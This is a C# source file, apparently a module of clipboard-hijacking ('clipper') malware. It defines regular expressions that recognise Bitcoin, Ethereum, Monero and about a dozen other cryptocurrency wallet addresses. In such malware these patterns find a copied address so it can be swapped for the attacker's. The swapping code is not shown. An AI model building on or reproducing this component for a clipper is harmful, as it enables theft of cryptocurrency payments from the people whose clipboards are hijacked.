using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Clipper.Modules
{
    internal sealed class RegexPatterns
    {
        public static Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
        {
            {"btc", new Regex(@"(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)") }, // Bitcoin
            {"eth", new Regex(@"(?:^0x[a-fA-F0-9]{40}$)") }, // Ethereum
            {"xmr", new Regex(@"(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)") }, // Monero
            {"xlm", new Regex(@"(?:^G[0-9a-zA-Z]{55}$)") }, // Stellar
            {"xrp", new Regex(@"(?:^r[0-9a-zA-Z]{24,34}$)") }, // Ripple
            {"ltc", new Regex(@"(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)") }, // Litecoin
            {"nec", new Regex(@"(?:^A[0-9a-zA-Z]{33}$)") }, // Neocoin
            {"bch", new Regex(@"^((bitcoincash:)?(q|p)[a-z0-9]{41})") }, // Bitcoin Cash
            {"dash", new Regex(@"(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)") }, // Dashcoin
            {"bnb", new Regex(@"bnb[a-zA-Z0-9]{39}$") }, // Binance coin
            {"sol",  new Regex(@"[a-zA-Z0-9]{44}$") }, // Solana
            {"trx",  new Regex(@"[a-zA-Z0-9]{21,42}$")}, // Tron
            {"ada", new Regex(@"addr[a-z0-9]{99}$") }, // Cardano
            {"doge", new Regex(@"D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}") }, // Dogecoin
            {"rvn", new Regex(@"RV[a-zA-Z0-9]{56}$") } // Ravencoin
        };
    }
}
